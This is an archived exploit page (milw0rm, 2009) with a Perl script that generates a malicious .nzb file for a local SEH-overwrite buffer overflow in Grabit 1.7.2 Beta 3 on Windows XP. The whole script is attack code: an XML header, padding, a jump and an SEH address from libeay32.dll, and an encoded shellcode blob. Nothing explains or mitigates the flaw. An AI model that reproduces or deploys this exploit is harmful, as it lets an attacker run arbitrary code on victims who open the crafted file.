<html><head><title>Grabit <= 1.7.2 Beta 3 (.nzb) Local Buffer Overflow Exploit (SEH)</title></head><pre>#!/usr/bin/perl
# Grabit&lt;=1.7.2 Beta 3 (.nzb) SEH Overwrite Exploit
# Coded by: Gaurav Baruah
# Discovery: Niels Teusink
#http://packetstormsecurity.org/filedesc/grabit-overflow.txt.html
# Greetz to Vivek
#Tested on XP SP3 and XP SP2 (en)
my $header1=
&quot;&lt;?xml version=\&quot;1.0\&quot;?&gt;
&lt;!DOCTYPE nzb
  PUBLIC \&quot;-//newzBin//DTD NZB 1.0//EN\&quot;
         \&quot;&quot;;

my $shellcode=
&quot;\x29\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xe8&quot;.
&quot;\x61\xfb\x36\x83\xeb\xfc\xe2\xf4\x14\x89\xbf\x36\xe8\x61\x70\x73&quot;.
&quot;\xd4\xea\x87\x33\x90\x60\x14\xbd\xa7\x79\x70\x69\xc8\x60\x10\x7f&quot;.
&quot;\x63\x55\x70\x37\x06\x50\x3b\xaf\x44\xe5\x3b\x42\xef\xa0\x31\x3b&quot;.
&quot;\xe9\xa3\x10\xc2\xd3\x35\xdf\x32\x9d\x84\x70\x69\xcc\x60\x10\x50&quot;.
&quot;\x63\x6d\xb0\xbd\xb7\x7d\xfa\xdd\x63\x7d\x70\x37\x03\xe8\xa7\x12&quot;.
&quot;\xec\xa2\xca\xf6\x8c\xea\xbb\x06\x6d\xa1\x83\x3a\x63\x21\xf7\xbd&quot;.
&quot;\x98\x7d\x56\xbd\x80\x69\x10\x3f\x63\xe1\x4b\x36\xe8\x61\x70\x5e&quot;.
&quot;\xd4\x3e\xca\xc0\x88\x37\x72\xce\x6b\xa1\x80\x66\x80\x91\x71\x32&quot;.
&quot;\xb7\x09\x63\xc8\x62\x6f\xac\xc9\x0f\x02\x9a\x5a\x8b\x61\xfb\x36&quot;;

my $next_seh = &quot;\xEB\x06\x90\x90&quot;;
my $seh = &quot;\xE5\x56\x01\x10&quot; ;   #libeay32.dll
my $file = &quot;test.nzb&quot;;

open (nzb, &quot;&gt;./$file&quot;) || die &quot;\nCan't open $file: $!&quot;;
print nzb &quot;$header1&quot; . &quot;\x41&quot; x 248 . &quot;$next_seh&quot; . &quot;$seh&quot; . &quot;$shellcode&quot;;
close (nzb);
sleep 1;
print &quot;\nFile $file successfully created!\n&quot;;

# milw0rm.com [2009-05-05]</pre></html>